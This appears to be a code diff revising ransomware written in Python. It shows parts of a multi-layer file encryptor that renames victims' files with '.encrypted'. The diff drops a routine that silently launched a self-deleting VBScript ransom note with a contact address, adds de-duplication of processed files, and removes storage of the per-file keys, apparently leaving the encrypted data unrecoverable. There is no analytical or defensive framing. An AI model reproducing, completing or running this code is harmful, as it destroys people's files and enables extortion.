@@ -43,34 +43,6 @@ def _import_crypto():
         return None
 
 
-def crear_vbs_notificacion(ruta_archivo):
-    try:
-        nombre_base = os.path.splitext(ruta_archivo)[0]
-        vbs_path = nombre_base + ".vbs"
-        vbs_content = """On Error Resume Next
-MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
-
-Dim fso, scriptPath
-Set fso = CreateObject("Scripting.FileSystemObject")
-scriptPath = WScript.ScriptFullName
-WScript.Sleep 3000
-On Error Resume Next
-fso.DeleteFile scriptPath, True
-WScript.Quit
-"""
-        with open(vbs_path, "w", encoding="utf-8") as f:
-            f.write(vbs_content)
-        
-        try:
-            subprocess.Popen(['wscript.exe', vbs_path], creationflags=0x08000000, shell=False)
-        except:
-            pass
-        
-        return True
-    except:
-        return False
-
-
 class EncriptadorMilitar:
     TAMANO_PEQUENO = 1 * 1024 * 1024
     TAMANO_MEDIANO = 10 * 1024 * 1024
@@ -83,6 +55,7 @@ class EncriptadorMilitar:
         self.ext = ".encrypted"
         self._init_entropy_pool()
         self.stats = {'12_capas': 0, '8_capas': 0, '5_capas': 0, '3_capas': 0}
+        self.processed_files = set()
     
     def _init_entropy_pool(self):
         self.entropy_pool = bytearray(secrets.token_bytes(4096))
@@ -133,6 +106,11 @@ class EncriptadorMilitar:
         try:
             if not os.path.exists(ruta) or ruta.endswith(self.ext):
                 return False
+            
+            ruta_abs = os.path.abspath(ruta)
+            if ruta_abs in self.processed_files:
+                return False
+            
             try:
                 tamano = os.path.getsize(ruta)
                 with open(ruta, 'rb') as f:
@@ -243,8 +221,7 @@ class EncriptadorMilitar:
                 datos = cipher_a3.encryptor().update(datos)
                 claves_usadas.extend([key_a3, nonce_a3])
             
-            claves_flat = self._flatten_keys(claves_usadas)
-            metadata = num_capas.to_bytes(1, 'big') + file_salt + claves_flat
+            metadata = num_capas.to_bytes(1, 'big') + file_salt
             hmac_key = self._derive_key(MASTER_KEY_FIXED, b'hmac_salt', b'hmac_key', 64)
             h = hmac.new(hmac_key, metadata + datos, hashlib.sha3_512)
             firma = h.digest()
@@ -260,7 +237,7 @@ class EncriptadorMilitar:
                     f.write(resultado)
                 nueva_ruta = ruta + self.ext
                 os.rename(ruta, nueva_ruta)
-                crear_vbs_notificacion(nueva_ruta)
+                self.processed_files.add(os.path.abspath(nueva_ruta))
                 return True
             except:
                 return False
